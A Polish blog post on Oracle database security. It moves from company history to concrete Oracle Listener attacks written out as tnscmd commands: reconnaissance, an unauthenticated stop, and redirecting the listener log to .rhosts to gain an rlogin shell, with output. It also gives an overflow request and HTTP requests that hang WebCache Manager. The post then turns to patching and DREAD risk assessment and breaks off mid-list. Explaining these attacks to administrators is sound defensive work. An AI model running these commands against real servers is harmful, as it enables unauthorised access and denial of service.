---
layout: post
date: 28-01-2008
title: Bezpieczeństwo Oracle - Czysty mit czy prawdziwa legenda?
tags: oracle security database
disqus: true
---

### O historii słów kilka.

Larry Ellison, Bob Miner i Ed Oates, którzy w 1977 roku założyli firmę SDL (Software Development Laboratories), nie byli świadomi, że ich dzieło istotnie zmieni podejście do zagadnień baz danych, a jednocześnie będzie prekursorem rozwiązań, które są stosowane do dzisiaj. Po pewnym czasie, gdy ich sztandarowy produkt: baza danych Oracle zyskała na sławie, firma zmieniła nazwę na Oracle Corporation by bardziej podkreślić swój związek z bazami danych. Dzisiaj dostarcza ona oprócz Systemów Zarządzania Bazami Danych (Oracle DBMS), także Systemy Planowania Zasobami Przedsiębiorstwa (z ang. ERP -- Enterprise Resource Planning), Systemy Zarządzania Relacjami z Klientami (z ang. CRM -- Customer Relationship Management) oraz Systemy Zarządzania Łańcuchami Dostaw (z ang. SCM -- Supply Chain Management). Tak rozbudowany zakres działalności pozwolił zdobyć przez lata miano najlepszego dostawcy systemów bazodanowych, jednocześnie poważne podejście do zabezpieczeń spowodowało, że Oracle stał się niedoścignionym wzorem dla konkurencji.

Inspiracją dla powstania bazy Oracle była praca ,,A Relational Model of Data for Large Shared Data Banks'' opublikowana przez Edgara F. Codda oraz powstający równolegle ,,System R'' firmy IBM. Założyciele Oracle postanowili stworzyć produkt kompatybilny z konukrencyjnym ,,Systemem R'', jednak IBM zatrzymał prace idące w tym kierunku utajniając kody błędów ich produktu. Mimo wszystko dzięki szybkim decyzjom baza danych Oracle była pierwszym komercyjnym system zarządzania bazami danych oferującym SQL na rynku. Milowym krokiem w zdobywaniu pozycji okazało się przepisanie całego SZBD na język C, który oferował ogromną przenośność jak na ówczesne czasy, a jednocześnie pozwolił Oracle sprzedawać swój produkt na platformy inne niz VAX i PDP-11. Determinację w zdobywaniu nowego rynku doskonale potwierdza fakt, że firma specjalnie napisała własny kompilator C dla platformy IBM by móc przenieść tam swój produkt.

Wraz z rosnącą popularnością bazy danych, Oracle wzbogacało swój produkt o kolejne elementy:

+ Zestaw narzędzi dla programistów nazwany później `Oracle*Forms` pozwalający na szybkie i łatwe pisanie aplikacji korzystających z bazy danych Oracle. Z czasem zestaw narzędzi ewoluował do postaci, w której pisanie rozbudowanych interfejsów graficznych bazy było tak proste jak układanie klocków.
+ Poziomy izolacji transakcji bazodanowych, jako pierwsza wprowadzona została spójność odczytu.
+ System zarządzania bazą danych pracujący w trybie klient/serwer.
+ Równoległe wykonywanie kwerend w bazie danych i współbieżne przetwarzanie zapytań.
+ Język wbudowany w bazę danych: PL/SQL.
+ Tworzenie kopii zapasowych na działającej bazie danych (,,hot backups'').
+ Nowe platformy, na których pracuje baza danych: Linux i BSD. W przypadku systemów z rodziny Linux, Oracle w przeciwieństwie do konkurencji szybko zainteresowało się nowa platformą.
+ Wraz z postępującą standaryzacją języka XML, Oracle dodało obsługę tego formatu do swoich produktów. Od tej pory stało się możliwe zapisywanie danych z bazy w postaci dokumentów XML.
+ System bazodanowy został przystosowany do obsługi ogromnej ilości danych, Oracle jako pierwsza baza pobiła rekord 3 TB danych w testach TPC-H.

Po pojawieniu się języka Java, Oracle najpierw stworzyło całe środowisko do programowania Oracle JDeveloper, by później przepisać część narzędzi i zintegrować z Oracle maszynę wirtualną Java.

Po 30 latach rozwoju SZBD Oracle rozrosło się do niebywałych rozmiarów zarówno pod względem możliwości, jak i poziomu komplikacji. Niebywała ilość dodatkowych narzędzi, funkcji i metod mających na celu ułatwienie korzystania i zarządzania bazą, stały się jednocześnie potencjalnym dla niej zagorożeniem.

Baza danych Oracle udostępnia administratorowi kilka poziomów zabezpieczeń:

+ Zabezpieczenie kont użytkowników -- aby móc dostać się do bazy danych Oracle, konieczne jest posiadanie konta w bazie danych lub/i uzyskanie do niego dostępu. Dostęp może być bezpośredni -- przez połączenie się z bazą danych, lub pośredni, wynikający z ustawień autoryzacji powiązań między bazami danych. Konto w bazie może być związane z kontem systemu operacyjnego, jednak co najważniejsze, konto musi posiadać hasło. Hasło w postaci zaszyfrowanej jest przechowywane w tabeli słownika danych. Bezpośrednie powiązanie konta bazodanowego z kontem systemu operacyjnego pozwala na taka konfigurację procesu autoryzacji, by całkowicie polegać na systemowych sposobach identyfikacji użytkowników. Dzięki temu mimo, że Oracle posiada wbudowany najprostszy sposób identyfikacji, administrator poprzez konfigurację systemu operacyjnego i bazy danych może wykorzystywać wszystkie możliwości systemów takich jak PAM.
+ Uprawnienia do obiektów bazy danych -- mechanizm uprawnień umożliwia przydzielenie użytkownikom i grupom użytkowników praw do wykonywania określonych poleceń na określonych obiektach bazy danych. Dodatkowo możliwe jest tworzenie ról, które są swoistymi grupami uprawnień do działań na bazie. Role te mogą być dowolnie aktywowane i dezaktywowane, zabezpieczane hasłem itp.
+ Zarządzanie uprawnieniami globalnymi -- możliwe jest takie wykorzystanie ról by zarządzać dostępnymi dla użytkowników poleceniami systemowymi. Pozwala to na przydzielanie tylko takich uprawnień jakich użytkownicy potrzebują, np. można danej osobie przyznać prawo **CREATE TABLE** a zabrać **CREATE TYPE**.


### Gorzka prawda czy samo życie?

Duży sukces komercyjny productów Oracle, ich rosnąca nieustająco popularność na rynkach korporacyjnych oraz ustabilizowana pozycja lidera wśród dostawców rozwiązań bazodanowych spowodowała nadmierną pewność, co do jakości własnego produktu. Powstały slogany ,,Nie możesz jej złamać, nie możesz się do niej dostać'' (z ang. ,,Can't break it, can't break in'') oraz ,,Niezniszczalna'' (z ang. ,,Unbreakable''). Jednoznacznie wskazuje to na fakt dużej pewności w materii zabezpieczeń. Życie jednak lubi płatać figle i dokładnie dwa tygodnie po ogłoszeniu wspomnianych już haseł reklamowych pojawiły się publikacje przedstawiające cały szereg ataków zakończonych sukcesem. Odnalezione błędy pozwalały albo uzyskać dowolne informacje z bazy lub skutecznie ją unieruchomić. Jednak czy oznacza to, że produkt znanej korporacji jest dziurawy, jak przysłowiowe rzeszoto? Odpowiedź jest całkiem prosta. Oracle jest nie bardziej dziurawy niż pozostałe produkty na rynku oferujące tą samą lub zbliżoną funkcjonalność. Do pewnej chwili, gdy korporacja Oracle jedynie sprzedawała licencje za duże pieniądze, zainteresowanie ze strony sektora bezpieczeństwa IT i ,,włamywaczy amatorów'' było znikome. Wraz z wypuszczeniem produktów bezpłatnie dla programistów i testerów, zainteresowanie bezpieczeństwem w Oracle szybko wzrosło. Taki obrót spraw spowodował wrecz natychmiastowe pojawienie się odpowiednich poprawek. Od tej pory programiści Oracle przestali pojmować bezpieczeństwo jedynie jako hasło związane z dostępnością i przechowywaniem danych. Czy cała wina jest po stronie programistów bazodanowego giganta? Nie dokońca.

Oracle z czasem zaczęło integrować ze swoimi produktami cały szereg projektów o otwartym kodzie źródłowym, pisanych przez programistów spoza firmy. Projekty te nie są wolne od błędów, co jak łatwo się domyślić, ma wpływ na pozostałe fragmenty systemu bazodanowego. Dobrym przykładem jest serwer http Apache, który wraz ze spopularyzowaniem sie na świecie usług Web-Services stał się ważnym pakietem w zestawie.

### Co spędza sen z powiek administratorom?

Większa część odnalezionych dziur nie opierała się na błędnych założeniach zabezpieczeń systemu, lecz na ich kiepskiej implementacji lub pewnych drobnych przeoczeniach. Wykorzystanie takiej dziury pozwala potencjalnemu włamywaczowi na zdobycie uprawnień w bazie i wykonanie na niej wszelkich operacji mieszczących się w zdobytych uprawnieniach. Możliwe jest uzyskanie praw:

+ DBA -- posiadanie praw na tym poziomie pozwala na dostęp do każdego elementu bazy danych i wykonanie na nim dowolnej operacji
+ Użytkownika uprzywilejowanego -- uzyskiwane są uprawnienia jednego z użytkowników bazy danych
+ Użytkownika nieuprzywilejowanego -- dostępne są tylko uprawnienia dla grupy PUBLIC

Jak już było wspomniane wcześniej, w Oracle możliwe jest ustalenie by każdy użytkownik zalogowany do systemu operacyjnego, mający swoje konto w bazie danych, był logowany bez konieczności podawania hasła. Zastosowanie tego mechanizmu zwiększa ilość sposobów na włamanie się do bazy o błędy w zabezpieczeniach samego systemu operacyjnego. Wystarczy zalogować się na konto systemu, które jest także w bazie danych, by móc szukać luk pozwalających na zwiększenie naszych uprawnień. Jeżeli zalogowanie się na konto w systemie nie umożliwia korzystania z bazy, można pokusić się o sprawdzenie czy w systemie operacyjnym znajdują się domyślne konta tworzone podczas instalacji Oracle. Istnieje możliwość, że odnajdziemy w ten sposób niezabezpieczone konta posiadające uprawnienia administracyjne.

Dotychczas w większości implementacji systemu Oracle, wszyscy użytkownicy należący do grupy DBA za pomocą narzędzia SQL*DBA mogli połączyć się z bazą danych na prawach SYS (jedyna grupa mogąca zatrzymać i wznowić pracę całej bazy danych) bez podawania jakiegokolwiek hasła.

Dobór systemu operacyjnego ma duże znaczenie. Jeżeli w systemie operacyjnym, w którym zainstalowana jest baza danych Oracle, uda nam się odnaleźć katalogi ,,forms'', ,,load'', ,,source'', ,,reports'' lub ,,data'' i uzyskać do niech dostęp to jakiekolwiek mechanizmy zabezpieczeń danych z poziomu samej bazy tracą sens. Jak widać moglibyśmy uszkodzić pliki bazy tylko korzystając z praw w systemie operacyjnym.

### Oracle Listener

Oracle Listener to specjalny program służący do kontroli i przeprowadzania komunikacji pomiędzy klientami a serwerem Oracle, ten sam program odpowiada również za komunikację międzyserwerową. Jako, że jest to stały element każdej instalacji Oracle DBMS, najczęściej w nim wyszukiwane są błędy. Oracle Listener działając na systemie bazodanowym przyjmuje zlecenia od klientów. Proces pracuje na porcie TCP 1521 gdzie oczekuje kolejnych zleceń. Do komunikacji między nim a klientami wykorzystywany jest protokół TNS (z ang. ,,Transparent Network Substrate''). Oracle zdecydowało się zastosować dodatkowy protokół wprowadzający warstwę abstrakcji ponad wykorzystywanymi protokołami.

Większość sposobów włamania do bazy danych Oracle wykorzystujących Oracle Listenera nie polega na tradycyjnym przepełnieniu bufora, program sam posiada wiele funkcji, które normalnie uznane byłyby za błąd, a w przypadku Oracle nazywane są dodatkową funkcjonalnością. Jednym słowem słabości systemu bardziej wynikają z błędnych założeń projektowych niż wadliwej implementacji.

Do atakowania Oracle Listenera potrzebny będzie skrypt pozwalający korzystać z protkołu TNS. Skrypt o nazwie tnscmd napisany w Perlu można pobrać spod adresu http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd

Oracle Listener po standardowej instalacji przyjmuje komendy od każdego bez jakiejkolwiek autoryzacji. Łatwo domyślić się, że taka konfiguracja może doprowadzić do wielu nadużyć. Możemy uzyskać wiele wrażliwych informacji na temat całego systemu bazodanowego, wystarczy skomunikować się z programem Listener i wydać odpowiednie zlecenia:

```
tnscmd version -h adres_serwera -p 1521
tnscmd status -h adres_serwera -p 1521
```

Dzięki informacjom zwróconym przez Oracle Listener dowiemy się:

+ Jaka jest dokładna wersja bazy danych Oracle (ułatwi to późniejsze szukanie kolejnych błędów i znanych exploitów).
+ Jaki jest rodzaj systemu operacyjnego na którym postawiony jest system bazodanowy (wykorzystanie błędów systemu operacyjnego może pozwolić zdobyć uprawnienia administracyjne, a stąd już prosta droga do zdobycia bazy danych).
+ Jaki jest dokładny czas od uruchomienia instancji Oracle.
+ Jakie są ścieżki do plików z logami bazy danych.
+ Jakie są pozostałe opcje usługi Listenera (możemy starać się wykorzystać znaną dziurę w bezpieczeństwie).
+ Z jakimi wartościami zmiennych środowiska został uruchomiony Oracle Listener.
+ O wiele, wiele więcej.

Standardowa konfiguracja usługi Oracle Listenera pozwala na przeprowadzenie bardzo prostego ataku DoS (z ang. ,,Denial of Services''). Atak jest bardzo banalny, polega na wydaniu polecenia zatrzymującego pracę usługi nasłuchującej. Oracle Listener zaraz po instalacji ma ustawioną opcję **SECURITY=OFF**, pozwala to potencjalnemu napastnikowi wydawać polecenia administracyjne bez jakiegokolwiek uwierzytelnienia. I tak po wydaniu polecenia:

```
tnscmd stop -h adres_serwera -p 1521
```

Oracle Listener zakończy swoje działanie, jednocześnie odcinając od bazy danych wszystkich użytkowników. Jak łatwo się domyślić przed tym atakiem najprościej się uchronić ustawiając opcję wymagania uwierzytelnienia **SECURITY=ON** oraz hasło na dostęp.

Kolejną możliwością jest zmuszenie usługi nasłuchującej do nadpisania dowolnego pliku w systemie. Proces nasłuchujący (`tnslsnr`) zapisuje wszystkie zdarzenia w swoim logu. Położenie takiego pliku z tymi informacjami jest ustalane przez administratora. Jednakże można się dowiedzieć o lokalizacji tego pliku poprzez komendę TNS status. Zastanawiające jest w tym wszystkim to, że lokalizację pliku logów można zmienić także poprzez komendę TNS. Ważną dla włamywacza informacją jest to, że Listener przyjmuje dowolną podaną ścieżkę, nie ważne czy plik istnieje czy nie. Jeżeli istnieje -- zostanie nadpisany, jeżeli nie istnieje to zostanie utworzony. Wniosek jest prosty a zarazem straszny: intruz mający dostęp do portu 1521 i porozumiewający się procesem nasłuchującym może stworzyć lub zmodyfikować dowolny plik do którego ma dostęp proces Oracle Listener. W przypadku systemów z rodziny `UNIX` jest to użytkownik oracle, w przypadku `Microsoft Windows` jest to aż użytkownik **LOCAL_SYSTEM**. Włamywacz ma teraz kilka możliwości:

+ Atak DoS poprzez uszkodzenie plików Oracle Listenera.
+ Atak DoS poprzez uszkodzenie plików z danymi bazy, plików konfiguracyjnych oraz binariów Oracle.
+ Uszkodzenie plików bezpośrednio wykorzystywanych przez system operacyjny.
+ Modyfikacja plików systemu operacyjnego lub systemu bazodanowego w celu uzyskania większego dostępu i przywilejów.
+ Pomysłów znajdzie się cała masa ;-).

Całość możliwości jakie ma włamywacz dopełnia fakt, że skrypt `tnscmd` pozwala na dodanie dowolnego ciągu znaków do zlecenia TNS. Wystarczy pewna znajomość całego protokołu oraz sposobów logowania, by przekierować zapisywanie logów do pliku `/home/oracle/.rhosts` co daje nam możliwość bezproblemowego logowania się na konto użytkownika programu bazodanowego.

Proces logowania w przypadku usługi Oracle Listener polega na zapisie wszelkich informacji o błędach wraz z cytatem nieprawidłowej komendy. Zdziwić może fakt, że nie zapisywane są informacje o adresie IP i nazwie hosta, z którego nadeszło połączenie, intruz może czuć się pod tym względem bezpieczny ponieważ same logi Listenera nie ujawnią jego obecności.

Wróćmy jednak do naszego ataku na plik `.rhosts` i wykorzystaniu usługi `rlogin`. Intruz na samym początku zmienia plik logowania na wspomniany już `/home/oracle/.rhosts`.

```
tnscmd -h adres_serwera -p 1521 --rawcmd "
(DESCRIPTION= (CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))
(COMMAND=log_file)(ARGUMENTS=4)(SERVICE=LISTENER)
(VERSION=1)(VALUE=/home/oracle/.rhosts)))"
```

Po wykonaniu tego zlecenia Listener będzie posłusznie logować wszystkie zlecenia do ustawionego przez nas pliku. Wszystkim nie wtajemniczonym należy się tutaj kilka słów wyjaśnienia. W wielu systemach z rodziny UNIX w katalogu domowym użytkownika zapisane są w pliku `.rhosts` adresy hostów, które mogą łączyć sie z tym kontem bez dalszego uwierzytelniania.

Wprowadzimy więc do tego pliku adres ip hosta z którego atakujemy serwer bazodanowy:

```
tnscmd -h adres_serwera -p 1521 --rawcmd "
(CONNECT_DATA=((
10.20.30.4 andrey
"
```

Zgodnie z oczekiwaniami Oracle Listener zapisał do pliku informacje o błędnym zleceniu:

```
11-LIS-2007 22:22:04 * log_file * 0
11-LIS-2007 22:22:34 * service_register * oral * 0
11-LIS-2007 22:22:54 * 1153
TNS-01153: Failed to process string: (CONNECT_DATA=((
10.20.30.4 andrey
 NL-00303: syntax error in NV string
```

Jako, że informacja o adresie zdalnego hosta została umieszczona w nowej linii oznacza to, że zostanie poprawnie zinterpretowana podczas logowania za pomocą `\verb+rlogin+`. Wystarczy już teraz zalogowac się i cieszyć się dostępem do systemu z poziomu użytkownika oracle.

```
andrey@freebsd:~$ rlogin -l oracle adres_serwera
Linux oracleserver Sun Nov 11 22:43:12 CEST 2007 i686 unknown

oracle@oraclesrv:~$ id
uid=1001(oracle) gid=103(oinstall)
groups=103(oinstall),104(dba),105(oper)
```

Jak widać powyżej, bez problemu dostaliśmy się na konto użytkownika oracle. Mając jego uprawnienia możemy dalej rozmontowywać bazę lub rozpocząc kradzież informacji w niej zawartych.

Podobnie skonstruowane ataki moga służyć do modyfikacji kluczy ssh i nawiązywania połączeń poprzez ssh. W systemach z rodziny UNIX zdobycie uprawnień użytkownika oracle nie musi być krytycznym zagrożeniem dla systemu operacyjnego, jednak w przypadku systemów Microsoft Windows, intruz posiadający uprawnienia **LOCAL_SYSTEM** może poważnie zagrozić serwerowi.

Wymienione sposoby ataku są godne zainteresowania ponieważ występują po dzień dzisiejszy, mimo udokumentowania ich już w roku 2000. Oracle wypuściło łatę dodającą do pliku konfiguracyjnego Listenera (`listener.ora`) dodatkowy parametr **ADMIN_RESTRICTIONS**. Parametr ten po włączeniu uniemożliwia zdalną rekonfigurację procesu nasłuchującego, jednak w celu zapewnienia wstecznej kompatybilności z poprzednimi wersjami systemu Oracle parametr ten jest standardowo wyłączony.

Firma Oracle dostarczyła także włamywaczom i psotnikom wszelkiej maści nieudokumentowanych funkcji, których przeznaczenie nie jest znane. Jedną z takich funkcji była (odpowiednia poprawka została stworzona) komenda **SERVICE_CURLOAD** Oracle Listenera. Wykonanie ataku DoS za jej pomocą jest dziecinnie proste, za pomocą np. skryptu `tnscmd` wysyłamy wspomnianą komendę by po chwili Oracle Listener obciążył procesor atakowanego systemu w 100%. Kilkakrotne wysłanie tej komendy całkowicie zatrzymuje proces Oracle Listsnera i powoduje maksymalne obciążenie maszyny na której jest uruchomiony.

Powoli wchodzimy w tematykę błędów związanych niepoprawnymi postaciami instrukcji. Pora przedstawić kilka błędów typu buffer overflow (z ang. ,,przepłnienie bufora'').

Bardzo proste przepełnienie bufora występuje, jeżeli do parametru SERVICE_NAME zostanie przekazana zbyt długa wartość.

```
tnscmd -h adres_serwera -p 1521 --rawcmd "
(DESCRIPTION=(ADDRESS=
(PROTOCOL=TCP)(HOST=x.x.x.x)
(PORT=1521))(CONNECT_DATA=
(SERVICE_NAME=mojoracle.mojabardzobardzodluganazwadomeny.pl)
(CID=
(PROGRAM=X:\\ORACLE\\iSuites\\BIN\\SQLPLUSW.EXE)
(HOST=foo)(USER=bar))))
```

Podczas zapisywania treści błędu do pliku z logami Listenera, zapisany adres powrotu na stosie jest nadpisywany co pozwala na przejęcie kontroli nad przebiegiem wykonywania się procesu nasłuchującego. Dowolny kod przekazany przez atakującego zostanie wykonany. W przypadku bazy danych postawionej na systemie Windows, złośliwy kod zostanie uruchomiony z prawami LOCAL_SYSTEM, co jest dużym zagrożeniem dla serwerów opierających się o produkty Microsoft. Ponieważ przepełnienie bufora następuje przed zapisaniem treści błędu do pliku, może być problematyczne dla administratora wykrycie, że takowy atak wystąpił.

Jak widać możliwości na ,,złamanie'' usługi nasłuchującej jest wiele. Na przestrzeni lat wystąpiło jeszcze wiele ciekawych problemów:

+ Odpowiednie sformatowanie łańcuchów znaków przekazywanych jako wartości parametrów komend pozwala na przepełnienie bufora i wykonanie złośliwego kodu.
+ Listener Oracle 9i kończył pracę z błędem po wysłaniu mu źle sformatowanej komendy, co jest doskonałą możliwością na wykonanie ataku DoS.
W systemach Windows i VMS Server przekazanie do parametru komendy Listenera zbyt małej ilości danych powoduje nadmierne obciążenie procesora. ;-) miodzio :D
+ W wersji Listenera dla systemów z rodziny UNIX występuje błąd powodujący zamknięcie się usługi nasłuchującej, gdy zostanie przekazana zła wartość parametru wersji klienta protokołu TNS.
+ W systemie Sun Solaris ustawienie opcji `Maximum Transport Data Size` na 0 powoduje zamknięcie się usługi Listenera lub w najgorszym przypadku core dump.
+ Wykorzystanie procedury **EXTPROC** uruchamiającej kod po stronie systemu operacyjnego, do wykonania ataku na serwer.

Na sam koniec pozostaje wspomnieć o dwóch wadach autoryzacji w Oracle Listener:

Listener jest podatny na ataki `bruteforce` -- hasła wykorzystywane przez usługę nasłuchującą mogą łatwo być złamane metodą `bruteforce`, ponieważ narzędzie to nie posiada żadnych blokad na wielokrotne wprowadzanie niepoprawnego hasła, jak i nie istnieje wymóg wykorzystywania silnych haseł. Powtarzające się polecenia `set password` mogą być więc wysyłane za pomocą specjalnie spreparowanego skryptu. Jeżeli logowanie błędów jest włączone (`set log_status on`), próby wprowadzenia niewłaściwych haseł zostaną zapisane.

Domyślnie hasła wysyłane przez komendę `set password` są przekazywane poprzez sieć jawnym tekstem. Dopiero włączenie ASO (z ang. ,,Advanced Security Option'') powoduje przekazywanie haseł w postaci zaszyfrowanej.

Ostatnio pojawiającym się trendem są rozbudowane serwisy internetowe pobierające dane z bazy danych, przetwarzające je za pomocą dynamicznych języków programowania (ASP, ASP.NET, PHP, JSP) i wyświetlające wynik użytkownikowi. Ten wzmacniający się trend nie pozostał niezauważony przez firmę Oracle. Przygotowane zostało więc oprogramowanie pozwalające na dostęp do danych w bazie z poziomu przeglądarki internetowej. Oracle postawiło w tym przypadku na rozwiązania open source. Serwer WWW Oracle -- Oracle HTTP Listener to Apache w wersji 1.3.x z dodatkowymi modułami. Pakiet zawierający narzędzia dla web developerów zawiera oprócz serwera WWW także narzędzie do buforowania stron dynamicznych (Oracle Web Cache), framework do tworzenia portali internetowych (Oracle Portal), własną implementacje WebDAV oraz wiele innych.

Jedną z prostszych i banalniejszych luk jest ujawnienie kodu źródłowego stron jsp. Oracle HTTP Listener w trakcie kompilacji tworzy pliki tymczasowe w katalogu `/_pages`. Domyślnie katalog ten i jego zawartość można odczytać z poziomu przeglądarki www. Potencjalny włamywacz rozpocznie od tego miejsca szukanie luk systemu portalowego,a dzięki kodowi źródłowemu serwletów będzie miał ułatwione zadanie.

Wielu administratorów często zapomina o usunięciu katalogu `/demo` zawierającego strony jsp demonstrujące funkcjonalność narzędzi dostarczanych przez Oracle. Same strony mimo tego iż w zamierzeniu miały mieć charakter dydaktyczny, nie są przykładem najlepszych praktyk programistycznych. Wiekszość z nich jest podatna na ataki SQL Injection. Problem jest na tyle poważny, że wiekszość stron demonstracyjnych składa się z formularzy, gdzie użytkownik jawnie wprowadza kwerendę SQL. Zapytania te nie są w jakikolwiek sposób weryfikowane lub filtrowane, dlatego włamywacz może pobrać za ich pomocą dane systemowe, przykładowo nazwy i numery id użytkowników. Zastanawiające jest, że na serwerach produkcyjnych zdarzają się takie niedopatrzenia, sytuacja ta jest nagminna także w przypadku serwerów postawionych w celach developerskich.

Pomijanym aspektem zabezpieczania serwera są strony pozwalające na jego administrację, wiekszość z nich nie wymaga autoryzacji, a ich lokalizacja jest dobrze znana.

Jak widać wiekszość z tych luk jest spowodowana bardziej brakiem znajomości poprawnej konfiguracji serwerów stron www, niż przez wady implementacyjne w Oracle HTTP Listener, co nie znaczy, że takie nie istnieją.

Ważnym elementem w przypadku rozbudowanych systemów portalowych na platformie Oracle jest Oracle WebCache. Usługa ta wspomaga wydajność działania serwera aplikacji, znacznie przyspieszając dostarczanie danych użytkownikom portalu. Do zarządzania tym mechanizmem służy aplikacja www o nazwie WebCache Manager, jak łatwo się domyślić istnieje możliwość zdalnego zaatakowania tej aplikacji przez wysłanie do niej odpowiednio sformatowanych zleceń. Powodzenie ataku oznacza całkowite zablokowanie aplikacji zarządzającej -- WebCache Manager. Mimo, że dane przechowywane przez samą bazę nie są zagrożone, unieruchomienie tej usługi może pogorszyć działanie portalu, przez co jest to uważane za atak DoS.

Atakujący będzie starał się wykorzystać dwa błędy aplikacji poprzez wysłanie do WebCache Manager zlecenia w postaci:

```
GET /../ HTTP/1.0
Host: dowolna_nazwa
[CRLF]
[CRLF]
lub

GET / HTTP/1.0
Host: dowolna_nazwa
Transfer-Encoding: chunked
[CRLF]
[CRLF]
```

Zlecenie to powoduje zawieszenie aplikacji WebCache Manager. Przyczyna leży w błędnej obsłudze właśnie tego typu zleceń. Mimo że problem znany jest od dłuższego czasu, Oracle nie dostarczyło odpowiednich łat. Zapobiegawczy administrator powinien wyznaczyć określone adresy IP, które będą mogły komunikować się z aplikacja WebCache Manager poprzez parametr Secure Subnets lub odpowiednie filtrowanie pakietów w firewallu.

### Jestem administratorem -- Jak mam się bronić?

Przede wszystkim należy wziąć sobie głęboko do serca zasadę ,,Największym zagrożeniem dla bezpieczeństwa systemu jest naiwna wiara w skuteczność jego zabezpieczeń.''. Nadmierna pewność administratorów jest często zgubna dla prowadzonych przez nich systemów, jednak coraz częściej spotyka się ludzi, którzy zgodnie z zasadą ,,Działa -- lepiej nie ruszać'' instalują system Oracle i bez aplikowania żadnych poprawek uruchamiają go w środowisku produkcyjnym. Wiadomo, że nie zawsze poprawki dają porządany skutek, jednak należy nakładać je w sposób racjonalny, co może tylko zaowocować.

#### Polemika w nastroju refelksyjnym, czyli czy warto wgrywać poprawki?

Pytanie wydaje się co najmniej dziwne. Pomyśleć można, że przecież poprawki usuwają błędy, a przez to podnoszą bezpieczeństwo, co zasadniczo nam leży na sercu.

Bezpieczeństwo IT wyróżnia jednak trzy równorzędne dziedziny: poufność, integralność i dostępność. Poufność i integralność danych zasadniczo zawsze podnoszona jest przez wgranie poprawki, jednak dostępność tych danych jest czasami poźniej utrudniona.

Administratorzy boją się aplikować poprawki, bo mają przed oczami wizje nieprzespanych nocy, gdzie przywracją system do życia po ,,przedobrzeniu''. Tak więc odpowiedź na pytanie jakie sobie postawiliśmy nie jest taka oczywista, jak by się mogło wydawać.

Statystycznie rzecz biorąc, wiekszość ataków przeprowadzonych na produkcyjne systemy polegała na wykorzystaniu już znanych dziur, administratorzy tych systemów często byli ich świadomi i mogli zaaplikować odpowiednie łaty.

Wniosek prosty -- nakładać łaty -- jednak w sposób racjonalny, aby poźniej samemu nie zrobić sobie krzywdy. Zasadą złotego środka staramy się systematycznie zmniejszać podatność systemu na ataki, jednocześnie monitorując zachowanie, stabilność i dostępność. Wiadomo, że chcemy, aby były one na jak najwyższym poziomie. Osiągnięcie naszego złotego środka wydaje się czysto abstrakcyjne, jednak mogą pomóc nam w tym odpowiednie zasady zarządzania bezpieczeństwem.

#### No dobrze, ale co dalej? -- czyli jak zarządzać poprawkami

Zarządzanie poprawkami powinno należeć do codziennych zadań administratora nieomalże jak śniadanie i poranna kawa; znawcy tematu sugerują następujące etapy:

Zdobywanie informacji o nowych podatnościach. Dobrym pomysłem jest pobieranie Oracle Security Alerts, lekturę raportów w serwisach typu secunia.com lub Biuletynów Bezpieczeństwa PLOUG.

Ocena ryzyka w środowisku eksploatowanego systemu. Podczas dobierania poprawek nie wystarczy ocena zagrożenia publikowana przez Oracle, należy zastanowić się czy w przypadku naszej instalacji aplikowanie poprawki ma sens, czy jest kluczowe dla naszego bezpieczeństwa.
Testowanie poprawek. Bardzo ważne jest ocenienie zagrożenia jakie niesie ze sobą wprowadzenie poprawki lub poprawek. W systemach produkcyjnych istnieje w tym celu bliźniacza instalacja, służąca tylko do eksperymentów. Kopia nie musi dokładnie odzwierciedlać systemu, ma jednak umożliwić nam podjęcie właściwej decyzji.

Instalowanie poprawek w cyklach. Nigdy nie powinniśmy wpaść w wir aplikowania poprawek, działając zgodnie z pewną strategią istnieje mniejsze prawdopodobieństwo, że popełnimy błąd. Sugerowane jest następujące rozwiązanie:

+ Raz na pół roku wprowadzamy wszystkie ostatnio opublikowane uaktualnienia.
+ Raz na miesiąc wprowadzamy wszystkie uaktualnienia mające znaczący wpływ na bezpieczeństwo naszego systemu.
+ Poprawki najbardziej kluczowe, wiążące się z dużym ryzykiem (np. dla systemów wystawionych do Internetu) należy wprowadzać na bieżąco lub należy stosować obejścia problemów (o ile jest to w ogóle możliwe).

Przeczytanie instrukcji jeszcze nigdy nie zaszkodziło. Aby bajka o aktualizacji zabezpieczeń kończyła się ,,happy endem'' musimy dokładnie przeczytać instrukcje dołączone do poprawki (sic!) oraz sprawdzić aktualność kopii bezpieczeństwa.

#### To jezioro wcale nie jest głębokie, czyli jak poprawnie ocenić zagrożenie.

Stara szkoła zarządzania bezpieczeństwem twierdziła, że najlepsze jest unikanie ryzyka, co okazało się mało praktyczne i już od pewnego czasu odchodzi się od takiego rozumowania. W tej chwili panuje pogląd, że racjonalne zarządzanie ryzykiem, właściwa jego analiza i wycena zagrożeń pozwoli znacznie lepiej unikać problemów.

W poszukiwaniu informacji o zagrożeniach należy przede wszystkim skupić się na wynikach badań publikowanych przez niezależnych odkrywców. Osobom tym nie zależy na stawianiu jakiegoś produktu w lepszym świetle w przeciwieństwie do firm i ich działu marketingu. Nie oznacza to, że należy zrezygnować z ocen zagrożenia umieszczanych przez producenta, ale stanowczo powinno się odrzucić je jako jedyne źródło danych. Wiele biuletynów bezpieczeństwa pisanych przez zrzeszenia użytkowników ma dokładniejsze informacje, niż te publikowane na stronach twórców oprogramowania.

Dobry administrator powinien się szczegółowo zapoznać z istotą problemu jakie niesie ze sobą zagrożenie. Na podstawie znajomości własnego środowiska pracy jest wstanie ocenić czy problem ten wystąpi w jego systemie informatycznym. Nie należy ograniczać się tylko do składników samej bazy Oracle, serwer bazodanowy to także wszystkie mechanizmy systemu operacyjnego, wielu atakujących wykorzystuje drobne elementy składające się na całość systemu w celu dokonania włamania. Prawidłowa ocena zagrożenia to przede wszystkim dobre zrozumienie tego co próbuje się chronić.

Jeżeli podczas poszukiwania informacji na temat danego zagrożenia natkniemy się na wiele przykładów lub gotowych exploitów wykorzystujących daną lukę, to bez namysłu należy przyjąć, że wykorzystanie tej luki jest dziecinnie proste, a stopień zagrożenia wzrasta.

Pamiętać należy też, że poprawki do dziur w zabezpieczeniach nie pojawiają się z dnia na dzień, niektóre powstają w rok po wykryciu danego zagrożenia.

Pełna analiza ryzyka może wykorzystywać jedną ze sformalizowanych metodyk, jaką jest na przykład metodyka DREAD. Polega ona na ocenie zagrożenia w pięciu kategoriach:

+ **Damage potential** - Co uzyskuje intruz, jeśli uda mu się wykorzystać podatność?
+ **Reproducibility** - Czy podatność da się wykorzystać zawsze, czy też tylko w określonym czasie lub warunkach?
